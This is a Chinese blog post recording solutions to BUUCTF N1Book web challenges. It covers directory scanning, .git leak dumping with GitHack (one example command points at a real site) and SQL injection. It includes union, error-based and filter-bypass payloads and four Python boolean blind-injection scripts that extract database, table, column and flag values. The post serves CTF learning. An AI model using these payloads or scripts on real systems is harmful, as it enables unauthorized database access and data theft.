---
title: "N1Book Web 学习"
date: 2021-12-28T00:17:37+08:00
draft: false
tags: ['ctf', 'web']
categories: ['learning']
---

[[https://buuoj.cn/challenges][buuctf]] n1book web刷题
* 信息收集
** 常见的收集
网站上可能会有敏感目录/文件导致信息泄漏，如.git，vim的备份文件.swp等。可以用[[https://github.com/maurosoria/dirsearch][dirsearch]]扫描站点目录。

#+begin_src shell
cd dirsearch
python3 dirsearch.py -u 192.168.21.128 -e php
#+end_src

- -u 指定目标ip
- -e 指定网站语言
- -w 可以加上自己的字典（带上路径）
- –random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）

脚本扫描的数据库在 =db= 文件夹，可以自己加。这题的目标文件有三个： =robots.txt= , =index.php~= , =.index.php.swp= 。我一开始扫了2次没扫出来，指定了php语言后扫出了robots.txt。

robots.txt是网站定的允许爬虫规则；后缀为~的是gedit的备份文件；.文件名.swp是vim的备份文件。

** 粗心的小李
git泄漏题可以用的工具有[[https://github.com/lijiejie/githack][GitHack]]，[[https://github.com/denny0223/scrabble][scrabble]]。只要目标网站上有.git，运行脚本就能把网站dump下来。

#+begin_src shell
GitHack.py http://www.openssl.org/.git/
#+end_src

#+begin_Src shell
scrabble http://example.com/
#+end_src
* SQL注入
- 数字型注入
  若输入参数为1，查询的语句为 =select * from table where id=1= 。若输入参数为1+1返回2的结果，基本能确定是数字型输入。
  参数前后没有过滤也没有引号，可以直接union。

- 字符型注入
  在输入参数前后加了引号。若输入参数为1，查询语句为 =select * from table where id = '1'= 。可以通过补全引号后在后面加union，在最后加上#或者--+注释掉之后的内容。

- 报错注入
  mysql中 =updatexml= 函数是用于更新xml文档的函数，语法是 =updatexml(目标xml文档, xml内路径, 更新的内容)= 第二个参数应该为合法的xpath路径，否则会报错同时输出传入的参数。可以用 =concat= 在语句前拼接一个 ='~'= 构造一个非法的xpath，系统会执行后面语句后返回结果，就变成了普通的字符型注入。


** SQL注入-1
先测试一下，发现只有id=1, 2, 3的时候有内容。id=3的时候提示有后门参数tips，tips=1会显示出执行的sql语句。

[[/img/2021-12-29_sql1-tips.png]]

可以看出是字符形式的注入。执行 =select * from notes where id ='-1' union select 1,2, group_concat(table_name) from information_schema.tables where table_schema=database()#'= 获取表名，查到有个表 =fl4g= 。要注意select出来的个数必须为3，直接 =select *= 查不到东西。应该是后台过滤了参数必须为3个，并且只有后面两个会显示，所以查出来的 =table_name= 也要用 =group_concat= 合并为一个字段。拿到表名后执行 =select * from notes where id ='4' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'fl4g' #'= 获取到列名为fllllag。最后执行 =select * from notes where id = '4' union select 1,2,fllllag from fl4g= 就能获取flag。
** SQL注入-2
看源码发现提示，参数加入 =&tips=1= 的时候会返回报错信息，是报错注入，如果不加提示就是布尔盲注。先来看用提示的。

随便输入用户名会提示账号不存在，用户名输admin提示账号或密码错误。注入点在用户名。执行 =name=admin' and (select extractvalue(1,concat(0x7e,(database()))))--+&pass=123= 拿到库名 =note= ， =name=admin' and extractvalue(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema = 'note'))--+&pass=123= 拿表名。看错误提示猜测 =select= 被过滤了，用双写 =selselectect= 替换 =select= 拿到表名 =fl4g= 。 =name=admin' and (selselectect extractvalue(1,concat(0x7e,(seleselectct group_concat(column_name) from information_schema.columns where table_name = 'fl4g'))))--+&pass=123= 拿到列名 =flag= ， =name=admin' and(select extractvalue(1,concat(0x7e,(selselectect group_concat(flag) from fl4g))))--+&pass=123= 拿到flag。

盲注参考了[[https://www.cnblogs.com/xiaochaofang/p/14873459.html][这篇博客]]。在用户名字段拼接上语句，若后面的语句成功执行，会提示“用户名或密码错误”，否则会提示“找不到用户”。这其实是布尔盲注，能够获得的信息只有真假值。要是连布尔返回值也没有，就只能用时间盲注了，也就是在语句最后连上 =or sleep(1)= ，根据返回时间判断是否执行，从而转换为布尔盲注。

先测试库名长度 =name=1' or length(database())=4#&pass=asdasd= ，数字为4的时候返回“用户名或密码错误”，确定库名长度为4。随后用 =name=1' or substr(database(),1,1) ='n'#&pass=asdasd= 一个一个字符测试库名。之后和前面的注入一样，找表名和列名，输出flag。用下面脚本爆破得到库名
#+begin_src python
import requests
import time

l = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'          #可能的字符
url = 'http://dc879727-d344-4402-aee0-5d997fcf4208.node3.buuoj.cn/login.php'
sql = "1' or substr(database(),%d,1)='%s'#"             #构造的注入语句
flag = ''
for num in range(1,5):           #根据库名长度进行循环
    for i in l:
        data = {                #构造字典数据
            'name' : sql %(num,i),          #把循环变量放入的sql语句中构造完整变化的sql语句
            'pass' : 'asdasd'
        }
        r = requests.post(url = url , data=data)        #对url提交post请求，data为用户名密码数据
        time.sleep(0.2)         #等待时间
        if r"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef" in r.text:     #根据回显确定库名
            flag += i
            print("flag:" , flag)
            break
print("flag:", flag)
#+end_src

爆表名

#+begin_Src python
import requests
import time
l = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'          #可能的字符
url = 'http://1b1372ff-b5cb-4f72-98c5-bc9d1f4d321d.node3.buuoj.cn/login.php'
#sql = "1' or substr(database(),%d,1)='%s'#"             #构造的注入语句
sql = "1' or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s'#"
flag = ''
for num in range(1,10):           #根据库名长度进行循环（因为不确定表名长度，我试着写长度稍微大点）
    for i in l:
        data = {                #构造字典数据
            'name' : sql %(num,i),          #把循环变量放入的sql语句中构造完整变化的sql语句
            'pass' : 'asdasd'
        }
        r = requests.post(url = url , data=data)        #对url提交post请求，data为用户名密码数据
        time.sleep(0.2)         #等待时间
        if r"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef" in r.text:     #根据回显确定库名
            flag += i
            print("flag:" , flag)
            break
print("flag:", flag)
#+end_src
字段名
#+begin_Src python
import requests
import time

l = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'
url = 'http://8454f388-49f3-4980-962b-7b7781dce053.node3.buuoj.cn/login.php'
#sql = "1' or substr(database(),%d,1)='%s'#"
#sql = "1' or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s'#"
sql = "1' or substr((seLEct group_concat(column_name) from information_schema.columns where table_name='fl4g'),%d,1)='%s'#"
flag = ''
for num in range(1,13):
    for i in l:
        data = {
            'name' : sql %(num,i),
            'pass' : 'asdasd'
        }
        r = requests.post(url = url , data=data)
        time.sleep(0.2)
        if r"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef" in r.text:
            flag += i
            print("flag:" , flag)
            break
print("flag:", flag)
#+end_src
flag
#+begin_Src python
import requests
import time

l = 'qwertyuiopasdfghjklzxcvbnm-=+_,.1234567890}{'
url = 'http://8454f388-49f3-4980-962b-7b7781dce053.node3.buuoj.cn/login.php'
#sql = "1' or substr(database(),%d,1)='%s'#"
#sql = "1' or substr((seLEct group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%s'#"
#sql = "1' or substr((seLEct group_concat(column_name) from information_schema.columns where table_name='fl4g'),%d,1)='%s'#"
sql = "1' or substr((seLEct flag from fl4g),%d,1)='%s'#&pass=asdasd"
flag = ''
for num in range(1,30):
    for i in l:
        data = {
            'name' : sql %(num,i),
            'pass' : 'asdasd'
        }
        r = requests.post(url = url , data=data)
        time.sleep(0.2)
        if r"\u8d26\u53f7\u6216\u5bc6\u7801\u9519\u8bef" in r.text:
            flag += i
            print("flag:" , flag)
            break
print("flag:", flag)
#+end_src
